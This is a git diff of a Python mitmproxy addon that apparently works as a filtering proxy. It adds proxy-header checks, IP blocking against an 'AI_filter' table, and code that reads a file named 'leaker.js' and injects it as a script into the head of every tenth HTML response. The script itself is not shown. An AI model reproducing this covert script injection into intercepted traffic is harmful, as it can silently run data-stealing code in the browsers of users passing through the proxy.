@@ -28,13 +28,35 @@ class Addon(object):
 				{"Content-Type": "text/html"}  # (optional) headers
 				)
 
-	def response(self, flow):
+
+
+	def response(self,flow):
+		#header analysis
+		proxy_headers = ['HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_PROXY_AGENT','HTTP_VIA','HTTP_PROXY_CONNECTION','HTTP_CLIENT_IP']
+		for i in flow.response.headers:
+			if i in proxy_headers:
+				soup = BeautifulSoup(self.return_htmlerror(5543,"Proxy Intrusion Detected.."))
+				flow.response.text = str(soup).encode("utf8")
+
+
 		netrequest = assemble_request(flow.request).decode('utf-8')
-		soup = BeautifulSoup(flow.response.content, "html.parser")
-		try:
-			titl =  soup.title
-		except Exception as e:
-			pass
+		print("Recieved requests:",netrequest)
+
+
+		if flow.response.headers['Content-Type'] != 'text/html':
+			return
+		if not flow.response.status_code == 200:
+			return
+		#process every 10 requests
+		if self.num % 10 == 0 :
+			html = BeautifulSoup(flow.response.text, 'lxml')
+			container = html.head or html.body
+			if container:
+				script = html.new_tag('script', type='text/javascript')
+				script.string = injected_javascript
+				container.insert(0, script)
+				flow.response.text = str(html)
+
 			
 
 	def list_filtering(self,filter_param):
@@ -45,8 +67,11 @@ class Addon(object):
 
 
 		#eppol namak ip address kitti eni matte sanam load cheyth compare cheyka
-
 		if filter_param.server_conn.ip_address:
+			if self.sqlread_exists("AI_filter","ip",filter_param.server_conn.ip_address[0]):
+				print('Proxy found by AI....')
+				return [True,"Stopping Breach,Heurestics Identified Proxy....",5544]
+
 			ipint = int(ipaddress.IPv4Address(filter_param.server_conn.ip_address[0]))
 			if self.sqlcheck_ip(ipint):
 				print('Found Blacklisted IP,Blocking')
@@ -164,6 +189,8 @@ if __name__ == "__main__":
 	conn = sqlite3.connect('db/filtered.db',check_same_thread=False)
 	cursor = conn.cursor()
 	print(cursor)
+	with open('leaker.js', 'r') as f:
+		injected_javascript = f.read()
 
 	error_html = open('GUI/error.html').read()
 	threading.Timer(5, nmap_parse).start()
